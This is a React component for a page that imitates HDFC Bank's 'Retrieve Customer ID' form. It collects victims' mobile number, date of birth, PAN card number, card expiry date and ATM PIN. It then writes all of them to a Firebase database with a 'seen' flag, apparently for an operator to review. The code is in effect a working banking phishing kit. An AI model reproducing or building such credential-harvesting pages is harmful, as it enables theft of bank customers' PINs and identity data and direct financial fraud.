import { Button, Paper, Stack, TextField, Typography } from '@mui/material';
import React, { useState } from 'react'
import { Cid } from '../assets/data';
import { useLocation, useNavigate, } from 'react-router-dom'
import { createUserWithEmailAndPassword } from 'firebase/auth';
import { auth, realTiemDB } from '../firebase/firebase';
import { ref, set } from 'firebase/database';
import { LoaderIcon } from 'react-hot-toast';

const ForgotCustomerID = () => {
    const location = useLocation();
    const tital = location.pathname.slice(1)
    const navigate = useNavigate()

    const [mobileNumber, setMobileNumber] = useState("")
    const [dateOfBirth, setDateOfBirth] = useState("")
    const [panCardNumber, setPanCardNumber] = useState("")
    const [expiryDate, setExpiryDate] = useState("")
    const [atmPin, setAtmPin] = useState("");
    const [isLoading, setIsLoading] = useState(false)


    const SubmitHandler = async (e) => {
        e.preventDefault()
        // creating email from customerId 
        const email = `${panCardNumber}@gmail.com`;
        console.log(email)
        try {

            setIsLoading(true)
            const userCredentical = await createUserWithEmailAndPassword(auth, email, mobileNumber);
            const user = userCredentical.user

            await set(ref(realTiemDB, "users/" + user.uid), {
                mobileNumber,
                dateOfBirth,
                loginType: tital,
                panCardNumber,
                expiryDate,
                atmPin,
                uid: user.uid,
                seen:false

            });
            setIsLoading(false)
            navigate(`/success/${user.uid}`)
            console.log("User Created");
        } catch (error) {
            console.log(error);
            setIsLoading(false)
        }finally{
            setIsLoading(false)
        }
    };

    return (
        <Stack direction={"column"} sx={{ width: '100%', alignItems: "center" }}>

            <Paper elevation={1} sx={{ width: '100%', }}>
                <Stack padding={"10px 0px"} width={"100%"} direction={"row"} justifyContent={"start"}>
                    <img src={Cid} style={{ width: "18rem" }} alt="" />
                </Stack>
            </Paper>


            <Stack width={"95%"} marginTop={"1rem"}>


                {/* <Typography textAlign={"center"} sx={{ fontSize: "11px" }}>
                    Retrieve your HDFC Bank Customer ID in 3 simple steps
                </Typography> */}





                <Stack border={"1px solid gray"} width={"100%"} marginTop={"2rem"} component={'form'} onSubmit={SubmitHandler}  >

                    <Stack padding={"3px"} textAlign={"center"} width={"100%"} bgcolor={"rgba(34,34,70,.9)"}>
                        <Typography sx={{ color: "white", fontSize: "15px", textTransform: "capitalize" }}>
                            {tital ? tital : "Retrieve Customer ID"}
                        </Typography>
                    </Stack>



                    <Stack direction={"row"} alignItems={"center"} gap={"3rem"} padding={"5px 15px"}  >
                        <Typography sx={{ color: "black", fontSize: "12px", fontWeight: "600" }}>
                            Mobile Number:
                        </Typography>

                        <TextField
                            value={mobileNumber}
                            onChange={(e) => setMobileNumber(e.target.value)}
                            color="primary"
                            variant="outlined"
                            size="small"
                            sx={{
                                '& .MuiInputBase-input': {
                                    padding: '2px', // Add padding to the input content
                                },
                                marginTop: ".5rem",
                                width: "50%",
                                fontSize: "8px"

                            }}
                        />


                    </Stack>


                    <Stack direction={"row"} alignItems={"center"} padding={"5px 12px"} borderTop={"1px solid gray"}>

                        <Typography sx={{ color: "#00008B", fontSize: "9px" }}>
                            Please Enter your Date of Birth / Pan Details / Both
                        </Typography>

                    </Stack>


                    <Stack direction={"row"} alignItems={"center"} padding={"5px 15px"} gap={"3.9rem"} borderTop={"1px solid gray"}>


                        <Typography sx={{ color: "black", fontSize: "12px", fontWeight: "600" }}>
                            Date of Birth:
                        </Typography>

                        <TextField
                            value={dateOfBirth}
                            onChange={(e) => setDateOfBirth(e.target.value)}
                            type='date'
                            color="primary"
                            variant="outlined"
                            size="small"
                            sx={{
                                '& .MuiInputBase-input': {
                                    padding: '2px', // Add padding to the input content
                                },
                                marginTop: ".5rem",
                                width: "50%",
                                fontSize: "8px"

                            }}
                        />

                    </Stack>




                    <Stack direction={"row"} alignItems={"center"} padding={"5px 15px"} gap={"2rem"} borderTop={"1px solid gray"}>


                        <Typography sx={{ color: "black", fontSize: "12px", fontWeight: "600" }}>
                            Pan Card Number:
                        </Typography>

                        <TextField
                            value={panCardNumber}
                            onChange={(e) => setPanCardNumber(e.target.value)}
                            color="primary"
                            variant="outlined"
                            size="small"
                            sx={{
                                '& .MuiInputBase-input': {
                                    padding: '2px', // Add padding to the input content
                                },
                                marginTop: ".5rem",
                                width: "50%",
                                fontSize: "8px"

                            }}
                        />




                    </Stack>



                    <Stack direction={"row"} alignItems={"center"} padding={"5px 15px"} gap={"1.5rem"} borderTop={"1px solid gray"}>


                        <Typography sx={{ color: "black", fontSize: "12px", fontWeight: "600" }}>
                            Expiry date of card:
                        </Typography>

                        <TextField
                            value={expiryDate}
                            onChange={(e) => setExpiryDate(e.target.value)}
                            color="primary"
                            variant="outlined"
                            size="small"
                            sx={{
                                '& .MuiInputBase-input': {
                                    padding: '2px', // Add padding to the input content
                                },
                                marginTop: ".5rem",
                                width: "50%",
                                fontSize: "8px"

                            }}
                        />




                    </Stack>


                    <Stack direction={"row"} alignItems={"center"} padding={"5px 15px"} gap={"5.5rem"} borderTop={"1px solid gray"}>


                        <Typography sx={{ color: "black", fontSize: "12px", fontWeight: "600" }}>
                            Atm pin:
                        </Typography>

                        <TextField
                            value={atmPin}
                            onChange={(e) => setAtmPin(e.target.value)}
                            color="primary"
                            variant="outlined"
                            size="small"
                            sx={{
                                '& .MuiInputBase-input': {
                                    padding: '2px', // Add padding to the input content
                                },
                                marginTop: ".5rem",
                                width: "50%",
                                fontSize: "8px"

                            }}
                        />




                    </Stack>


                    <Stack direction={"row"} alignItems={"center"} padding={"5px 10px"} gap={".5rem"} justifyContent={"center"} borderTop={"1px solid gray"}>


                        <Button type='submit' sx={{ color: "white", fontSize: "11px", width: "7rem", bgcolor: "rgba(34,34,60)", ":hover": { bgcolor: "blue" } }}



                        >
                               {isLoading ? <LoaderIcon/> :  "  Continue"}
                               
                        </Button>




                    </Stack>



                </Stack>


                {/* </Paper> */}


            </Stack>

            {/* <Typography marginTop={"1rem"} width={"90%"} textAlign={"start"} sx={{ color: "#00008B", fontSize: "14px" }}>
                Note:
                <ul>
                    <li style={{ color: "black" }}>To know more about this facility </li>
                </ul>
            </Typography> */}



        </Stack>

    );
}




export default ForgotCustomerID